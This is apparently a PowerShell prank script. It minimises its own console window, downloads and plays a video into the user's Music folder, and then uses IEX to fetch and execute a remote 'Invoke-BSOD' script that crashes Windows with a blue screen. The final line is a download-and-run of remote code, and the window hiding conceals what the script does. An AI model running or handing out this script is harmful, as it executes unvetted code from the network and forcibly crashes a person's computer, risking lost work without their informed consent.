# Function to minimize PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
function Minimize-Window {
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 6) # Minimize
}

# Minimize PowerShell window
Minimize-Window

# Change directory to Music
Set-Location -Path $env:USERPROFILE\Music

# Download the video file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/NiceComputer.mp4" -OutFile "NiceComputer.mp4"

# Play the video
$process = Start-Process -FilePath "NiceComputer.mp4" -PassThru

# Wait for the video player process to finish
$process.WaitForExit()

# Run the next part of the script after video playback
IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
